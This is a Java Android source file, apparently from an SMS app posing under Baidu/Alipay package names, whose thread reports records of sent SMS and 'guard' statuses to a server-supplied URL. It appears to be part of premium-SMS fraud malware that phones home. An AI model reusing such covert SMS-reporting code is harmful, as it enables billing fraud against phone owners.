package com.baidu.alipay.script.sms;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.util.List;

import com.baidu.alipay.Constant;
import com.baidu.alipay.LogUtil;
import com.baidu.alipay.NetWorkUtils;
import com.baidu.alipay.UserLogUtil;

import android.content.Context;
import android.os.Handler;

public class SyncThread extends Thread{
	
	private static final String TAG = "SyncThread";

	private Context context;
	
	private Handler handler;
	
	private static int FETCHNUM = 10;
	
	public SyncThread(Context context,final Handler handler){
		this.context = context;
		this.handler = handler;
		
		this.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
			
			@Override
			public void uncaughtException(Thread arg0, Throwable e) {
				e.printStackTrace();
				handler.sendEmptyMessage(Constant.STATUS_SYNCH_FAIL);
			}
		});
	}
	
	@Override
	public void run() {
		
		boolean succ = true;
		
		SendSmsPojoHandler sendSmsPojoHandler = null;
		
		try{
			sendSmsPojoHandler = new SendSmsPojoHandler(context);
			
			List<SendSmsPojo> list = sendSmsPojoHandler.listNeedSync(FETCHNUM);
			
			if(list != null && list.size() > 0){
				LogUtil.e(TAG, "need sync list size : "+list.size());
				for(SendSmsPojo sendSmsPojo : list){
					if(sendSmsPojo.getSendStatus() != SendSmsPojo.SENDSTATUS_ORI
						&& sendSmsPojo.getSendSync() == SendSmsPojo.SENDSYNC_ORI){
							if(!syncSend(sendSmsPojo)){
								succ = false;
								break;
							}else{
								sendSmsPojo.setSendSync(SendSmsPojo.SENDSYNC_SUCC);
								sendSmsPojoHandler.updateSendSync(sendSmsPojo);
							}
						}
					if(sendSmsPojo.getGuardStatus() != SendSmsPojo.GUARDSTATUS_ORI
							&& sendSmsPojo.getGuardSync() == SendSmsPojo.GUARDSYNC_ORI){
								if(!syncGuard(sendSmsPojo)){
									succ = false;
									break;
								}else{
									sendSmsPojo.setGuardSync(SendSmsPojo.GUARDSYNC_SUCC);
									sendSmsPojoHandler.updateGuardSync(sendSmsPojo);
								}
							}
					
					if((sendSmsPojo.getSendStatus() > SendSmsPojo.SENDSTATUS_ORI
							&& sendSmsPojo.getSendSync() == SendSmsPojo.SENDSYNC_SUCC
							&& sendSmsPojo.getGuardSync() == SendSmsPojo.GUARDSYNC_SUCC)
							|| (sendSmsPojo.getSendStatus() < SendSmsPojo.SENDSTATUS_ORI
									&& sendSmsPojo.getSendSync() == SendSmsPojo.SENDSYNC_SUCC)){
						sendSmsPojoHandler.deleteByKey(sendSmsPojo);
					}
					
				}
				
			}else{
				LogUtil.e(TAG, "no list need sync");
			}
			
		}catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(sendSmsPojoHandler != null){
				sendSmsPojoHandler.close();
			}
		}

		LogUtil.e(TAG, "sync status : "+succ);
		
		if(succ){
			handler.sendEmptyMessage(Constant.STATUS_SYNCH_SUCC);
		}else{
			handler.sendEmptyMessage(Constant.STATUS_SYNCH_FAIL);
		}
	}
	
	private boolean syncGuard(SendSmsPojo sendSmsPojo){
		String url = sendSmsPojo.getReport();
		
		url += "?"+sendSmsPojo.getGuardParam();
		
		return sync(context,url);
	}
	
	private boolean syncSend(SendSmsPojo sendSmsPojo){
		
		String url = sendSmsPojo.getReport();
		
		url += "?"+sendSmsPojo.getSendParam();
		
        return sync(context,url);
	}
	
	public static boolean sync(Context context,String url){
		String mUrl = url.replace(" ", "").replace("'", "");
//        LogUtil.e(TAG,"mUrl~~~~"+mUrl + "");
        
//        UserLogUtil.addLog(context, "synchThread:"+mUrl);
        
        String strResult = "";
        int i = 0;
		
        while (i < 4 && !strResult.equals("ok")) {
        	HttpURLConnection httpUrlConnection = null;
        	InputStream inStrm = null;
            BufferedInputStream bis = null;
            ByteArrayOutputStream baos = null;
            
            try {

            	httpUrlConnection = NetWorkUtils
                        .getHttpURLConnection(context, mUrl);

                httpUrlConnection.setAllowUserInteraction(true);
                httpUrlConnection.setDoOutput(true);
                httpUrlConnection.setDoInput(true);
                httpUrlConnection.setUseCaches(false);
                httpUrlConnection.setRequestMethod("GET");
                httpUrlConnection.setConnectTimeout(20000);
               
                inStrm = httpUrlConnection.getInputStream();
                
                baos = new ByteArrayOutputStream();
                
                bis = new BufferedInputStream(inStrm);
                byte[] buf = new byte[1024];
                int readSize = -1;
                
                while ((readSize = bis.read(buf)) != -1) {
                	baos.write(buf, 0, readSize);
                }
                
                byte[] data = baos.toByteArray();
            	
                strResult = new String(data,"utf-8");
                
                Thread.sleep(3000);
            } catch (Exception e) {
//                LogUtil.e(TAG, " httpResponse happens exception: "+ e.toString());
                e.printStackTrace();
            }finally{
            	if(baos != null){
            		try {
    					baos.close();
    				} catch (IOException e) {
    					e.printStackTrace();
    				}
            	}
            	if(bis != null){
            		try {
    					bis.close();
    				} catch (IOException e) {
    					e.printStackTrace();
    				}
            	}
            	
            	if(inStrm != null){
            		try {
    					inStrm.close();
    				} catch (IOException e) {
    					e.printStackTrace();
    				}
            	}
            	
                if (httpUrlConnection != null) {
                    httpUrlConnection.disconnect();
                    httpUrlConnection = null;
                }
            }
            i++;
//            LogUtil.e(TAG, "sync ~~~~strResult: " + strResult);
        }
		
        System.gc();
        
		return strResult.equals("ok");
	}
}